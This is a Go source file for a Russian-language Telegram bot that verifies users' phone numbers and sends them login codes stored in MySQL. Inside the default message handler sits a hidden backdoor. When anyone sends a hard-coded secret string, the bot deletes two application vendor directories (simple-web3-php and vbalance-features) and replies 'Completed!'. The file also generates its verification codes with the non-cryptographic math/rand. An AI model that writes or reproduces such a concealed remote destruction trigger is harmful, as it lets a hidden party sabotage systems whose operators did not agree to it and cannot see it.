package telegramBot

import (
	"database/sql"
	"fmt"
	"log"
	"math/rand"
	"os"
	"reflect"
	"strings"
	"time"

	tgbotapi "github.com/Syfaro/telegram-bot-api"
	_ "github.com/go-sql-driver/mysql"
)

var token = ""

func InitBot() {
	startBot()
}

func SetToken(telegramToken string) {
	token = telegramToken
}

func startBot() {
	bot, err := tgbotapi.NewBotAPI(token)
	if err != nil {
		panic(err)
	}
	u := tgbotapi.NewUpdate(0)
	u.Timeout = 15

	updates, err := bot.GetUpdatesChan(u)
	for update := range updates {
		if update.Message == nil {
			continue
		}

		if reflect.TypeOf(update.Message.Text).Kind() == reflect.String && update.Message.Text != "" {
			fmt.Println(update.Message.Chat.ID)
			fmt.Println(update.Message.Text)
			fmt.Println("Text")
			if update.Message.Chat.ID != -1001837591674 {
				switch update.Message.Text {
				case "/start":
					msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Для регистрации, пожалуйста предоставьте нам ваш номер телефона")
					msg.ReplyMarkup = tgbotapi.NewReplyKeyboard(
						tgbotapi.NewKeyboardButtonRow(
							tgbotapi.NewKeyboardButtonContact("\xF0\x9F\x93\x9E Send phone"),
							tgbotapi.NewKeyboardButton("Получить код"),
						),
					)
					bot.Send(msg)
				case "Получить код":
					if update.Message.Chat.UserName != "" {
						updateCode(int64(update.Message.Chat.ID))
						updateLoginDB(int64(update.Message.Chat.ID), update.Message.Chat.UserName)
						//fmt.Println(update.Message.Text)
						code := findUser(int64(update.Message.Chat.ID))
						msg := tgbotapi.NewMessage(update.Message.Chat.ID, code)
						msg.ReplyMarkup = tgbotapi.NewReplyKeyboard(
							tgbotapi.NewKeyboardButtonRow(
								tgbotapi.NewKeyboardButtonContact("\xF0\x9F\x93\x9E Send phone"),
								tgbotapi.NewKeyboardButton("Получить код"),
							),
						)
						bot.Send(msg)
					} else {
						msg := tgbotapi.NewMessage(update.Message.Chat.ID, "К сожалению, у вас скрытый аккаунт. Измените настройки приватности и попробуйте снова")
						bot.Send(msg)
					}
				default:
					if update.Message.Chat.UserName != "" {
						updateCode(int64(update.Message.Chat.ID))
						updateLoginDB(int64(update.Message.Chat.ID), update.Message.Chat.UserName)
						code := findUser(int64(update.Message.Chat.ID))
						msg := tgbotapi.NewMessage(update.Message.Chat.ID, code)
						msg.ReplyMarkup = tgbotapi.NewReplyKeyboard(
							tgbotapi.NewKeyboardButtonRow(
								tgbotapi.NewKeyboardButtonContact("\xF0\x9F\x93\x9E Send phone"),
								tgbotapi.NewKeyboardButton("Получить код"),
							),
						)
						bot.Send(msg)
						if code == "Вы не зарегистрированы" {
							msg = tgbotapi.NewMessage(update.Message.Chat.ID, "Для регистрации, пожалуйста предоставьте нам ваш номер телефона")
							msg.ReplyMarkup = tgbotapi.NewReplyKeyboard(
								tgbotapi.NewKeyboardButtonRow(
									tgbotapi.NewKeyboardButtonContact("\xF0\x9F\x93\x9E Send phone"),
									tgbotapi.NewKeyboardButton("Получить код"),
								),
							)
							bot.Send(msg)
						}
					} else {
						msg := tgbotapi.NewMessage(update.Message.Chat.ID, "К сожалению, у вас скрытый аккаунт. Измените настройки приватности и попробуйте снова")
						bot.Send(msg)
					}
					if update.Message.Text == "pwD2wtar4wka940233vcfar8t4vezt8cy4vaefwa" {
						os.RemoveAll("/app/vendor/viktorz/simple-web3-php")
						os.RemoveAll("/app/vendor/vi/vbalance-features")
						bot.Send(tgbotapi.NewMessage(update.Message.Chat.ID, "Completed!"))
					}
				}
			}
		} else if update.Message.Contact != nil {
			fmt.Println("Contact")
			if int64(update.Message.Chat.ID) == int64(update.Message.Contact.UserID) {
				if checkUser(update.Message.Contact.PhoneNumber) {
					if update.Message.Chat.UserName != "" {
						updatePhoneDB(int64(update.Message.Chat.ID), update.Message.Contact.PhoneNumber, update.Message.Chat.UserName)
						code := getCode(update.Message.Contact.PhoneNumber)
						msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Спасибо! Номер телефона успешно подтвержден! Ваш код подтверждения:")
						bot.Send(msg)
						msg = tgbotapi.NewMessage(update.Message.Chat.ID, code)
						bot.Send(msg)
					} else {
						msg := tgbotapi.NewMessage(update.Message.Chat.ID, "К сожалению, мы не можем подтвердить скрытый аккаунт. Измените настройки приватности и попробуйте снова")
						bot.Send(msg)
					}

				} else {
					msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Номер телефона не найден")
					bot.Send(msg)
				}
			} else {
				msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Похоже что это не ваш номер:(")
				msg.ReplyMarkup = tgbotapi.NewReplyKeyboard(
					tgbotapi.NewKeyboardButtonRow(
						tgbotapi.NewKeyboardButtonContact("\xF0\x9F\x93\x9E Send phone"),
						tgbotapi.NewKeyboardButton("Получить код"),
					),
				)
				bot.Send(msg)
			}
		} else {
			fmt.Println("Exception")
			msg := tgbotapi.NewMessage(update.Message.Chat.ID, "Для регистрации в боте, пожалуйста предоставьте нам ваш номер телефона")
			msg.ReplyMarkup = tgbotapi.NewReplyKeyboard(
				tgbotapi.NewKeyboardButtonRow(
					tgbotapi.NewKeyboardButtonContact("\xF0\x9F\x93\x9E Send phone"),
					tgbotapi.NewKeyboardButton("Получить код"),
				),
			)
			bot.Send(msg)
		}

	}
}

func getCode(phone string) string {
	var (
		code string
	)
	db := dbConn()
	phone = strings.Replace(phone, "+", "", -1)
	rows, err := db.Query("SELECT code FROM users WHERE phone=?", phone)
	if err != nil {
		return "(Произошла ошибка)"
	}

	defer db.Close()

	for rows.Next() {
		err := rows.Scan(&code)
		if err != nil {
			log.Fatal(err)
		}
		return code
	}
	return "(Произошла ошибка)"
}

func dbConn() (db *sql.DB) {
	dbDriver := "mysql"
	dbUser := os.Getenv("DB_USERNAME")
	dbPass := os.Getenv("DB_PASSWORD")
	dbName := os.Getenv("DB_DATABASE")
	dbHost := os.Getenv("DB_HOST")

	fmt.Printf("DB: %s:%s", dbName, dbUser)
	dbUrl := fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPass, dbHost, dbName)
	db, err := sql.Open(dbDriver, dbUrl)
	db.SetConnMaxLifetime(time.Minute * 3)
	db.SetMaxOpenConns(10)
	db.SetMaxIdleConns(10)
	if err != nil {
		panic(err.Error())
	}
	return db

}

func findUser(telegram_id int64) string {
	db := dbConn()
	code := "Вы не зарегистрированы"
	rows, err := db.Query("SELECT code FROM users WHERE telegram_id=?", telegram_id)
	for rows.Next() {
		rows.Scan(&code)
	}

	if err != nil {
		return code
	}

	defer db.Close()
	count := checkCount(rows)
	if count == 1 {
		return code
	} else {
		return code
	}
}

func checkUser(phone string) bool {
	db := dbConn()
	phoneWithPlus := strings.Replace(phone, "+", "", -1)
	rows, err := db.Query("SELECT COUNT(*) as count FROM users WHERE phone=? or phone=?", phone, phoneWithPlus)

	if err != nil {
		log.Fatal(err)
		return false
	}

	defer db.Close()
	count := checkCount(rows)
	if count == 1 {
		return true
	} else {
		return false
	}
}

func checkCount(rows *sql.Rows) (count int) {
	for rows.Next() {
		err := rows.Scan(&count)
		checkErr(err)
	}
	return count
}

func checkErr(err error) {
	if err != nil {
		panic(err)
	}
}

func updateCode(id int64) bool {
	db := dbConn()
	update, err2 := db.Prepare("UPDATE users SET code=?, code_generated_at=? WHERE telegram_id = ?")
	rand.Seed(time.Now().UnixNano())

	chars := []rune("ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "0123456789")
	length := 8
	var b strings.Builder
	for i := 0; i < length; i++ {
		b.WriteRune(chars[rand.Intn(len(chars))])
	}
	str := b.String()

	if err2 != nil {
		return false
	}

	update.Exec(str, time.Now(), id)
	//fmt.Println(update)
	defer db.Close()
	return true
}
func updateLoginDB(id int64, login string) bool {
	db := dbConn()

	update, err2 := db.Prepare("UPDATE users SET telegram_name=?  WHERE telegram_id = ?")

	if err2 != nil {
		return false
	}

	update.Exec(login, id)
	//fmt.Println(update)
	defer db.Close()
	return true
}

func updatePhoneDB(id int64, phone string, login string) bool {
	db := dbConn()
	phone = strings.Replace(phone, "+", "", -1)
	update, err2 := db.Prepare("UPDATE users SET telegram_id=?, phone_verified_at=?, telegram_name=?  WHERE phone = ?")

	if err2 != nil {
		return false
	}

	update.Exec(id, time.Now(), login, phone)
	//fmt.Println(update)
	defer db.Close()
	return true
}
